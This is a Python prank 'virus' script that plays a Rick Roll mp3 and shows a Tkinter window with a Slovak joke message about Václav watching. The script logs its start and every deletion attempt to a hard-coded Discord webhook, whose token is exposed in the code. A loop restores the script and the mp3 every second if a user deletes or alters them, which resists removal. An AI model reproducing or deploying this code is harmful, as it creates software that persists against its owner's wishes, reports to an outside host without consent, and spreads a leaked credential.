import os, time
import threading
import requests
def log_to_discord(msg:str):
  data = {"username":"VirusLog", "content":msg}
  requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
log_to_discord("Virus started...")
home_dir = r"C:\Users\justlinux"  # Use raw string


files_to_backup = [
  (__file__, __file__),
  (rf"{home_dir}\Downloads\Google_Stable_x64\assets\cache\youtube_com-watch-dQw4w9WgXcQ.mp3", 
   rf"{home_dir}\Music\youtube_com-watch-dQw4w9WgXcQ.mp3")
]

backuped_files = [open(path, "rb").read() for path, _ in files_to_backup]


def start():
    chnapik_duration = 2*60+10
    
    import time

    import os
    def music_func():
      os.system("start %USERPROFILE%/Music/youtube_com-watch-dQw4w9WgXcQ.mp3")
      time.sleep(chnapik_duration) 
    music = threading.Thread(target=music_func)
    music.start() 


    import tkinter as tk
    root = tk.Tk()
    root.title("GAMA Halloween")
    canvas = tk.Canvas(root, width=800,height=600,bg="skyblue")
    canvas.pack()
    points = [(250, 150), (300, 500), (500, 200)]
    canvas.create_rectangle(points[0], points[1], fill='red', outline="red")
    canvas.create_rectangle(points[2], points[0], fill='red', outline="red")
    canvas.create_text(400, 550, text="Václav vás sleduje so svojim neviditeľným plášťom", fill="green")
    root.mainloop()

virus = threading.Thread(target=start)
virus.start()

while True:
  for index, file_paths in enumerate(files_to_backup):
    backup = backuped_files[index]
    for path in file_paths:
      if not os.path.exists(path) or open(path, "rb").read() != backup:
        with open(path, "wb") as file:
          file.write(backup)
        log_to_discord(f"they tried to delete file {path}")
  time.sleep(1)



